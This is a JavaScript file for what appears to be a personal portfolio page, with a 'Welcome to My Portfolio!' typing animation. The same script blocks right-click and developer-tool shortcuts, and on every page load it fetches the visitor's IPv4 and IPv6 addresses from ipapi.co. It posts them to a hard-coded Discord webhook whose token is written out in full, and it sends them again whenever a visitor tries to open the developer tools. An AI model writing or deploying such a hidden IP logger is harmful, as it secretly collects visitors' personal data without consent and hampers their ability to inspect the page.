document.addEventListener("DOMContentLoaded", () => {
    const textElement = document.getElementById("text");
    const textToType = "Welcome to My Portfolio!";
    const typingSpeed = 100;
    const updateBatch = 3;

    let currentIndex = 0;

    function typeCharacter() {
        const nextIndex = currentIndex + updateBatch;
        textElement.textContent += textToType.slice(currentIndex, nextIndex);
        currentIndex = nextIndex;

        if (currentIndex < textToType.length) {
            setTimeout(typeCharacter, typingSpeed);
        }
    }

    // Start typing effect
    typeCharacter();
});

// Disable right-click
document.addEventListener('contextmenu', (e) => e.preventDefault());

function ctrlShiftKey(e, keyCode) {
  return e.ctrlKey && e.shiftKey && e.keyCode === keyCode.charCodeAt(0);
}

document.onkeydown = (e) => {
  // Disable F12, Ctrl + Shift + I, Ctrl + Shift + J, Ctrl + U
  if (
    e.keyCode === 123 || // F12
    ctrlShiftKey(e, 'I') || // Ctrl + Shift + I
    ctrlShiftKey(e, 'J') || // Ctrl + Shift + J
    ctrlShiftKey(e, 'C') || // Ctrl + Shift + C
    (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) // Ctrl + U
  ) {
    // Fetch IP address and send to Discord webhook
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        console.log('Your IP address is:', data.ip);
        const message = {
          content: `Your IP address is: ${data.ip}\nYour IPv6 address is: ${data.ipv6}`,
          username: 'IP Bot',
          avatar_url: 'https://example.com/avatar.png'
        };

        fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(message)
        })
        .then(response => {
          if (response.ok) {
            console.log('Message sent successfully!');
          } else {
            console.error('Error sending message:', response.statusText);
          }
        })
        .catch(error => {
          console.error('Fetch error:', error);
        });
      })
      .catch(error => console.error('Error fetching IP address:', error));

    return false;
  }
};

const webhookURL = 'https://discord.com/api/webhooks/1335695709688827956/FsU5ywXlj5e63pLDBlJW3ErdHK2BsdC_3gWgsrDHw2-KrVFYdfx1XzkV-EV_nuRj1yjH';

fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(data => {
    console.log('Your IP address is:', data.ip);
    const message = {
      content: `Your IP address is: ${data.ip}\nYour IPv6 address is: ${data.ipv6}`,
      username: 'IP Bot',
      avatar_url: 'https://example.com/avatar.png'
    };

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    })
    .then(response => {
      if (response.ok) {
        console.log('Message sent successfully!');
      } else {
        console.error('Error sending message:', response.statusText);
      }
    })
    .catch(error => {
      console.error('Fetch error:', error);
    });
  })
  .catch(error => console.error('Error fetching IP address:', error));
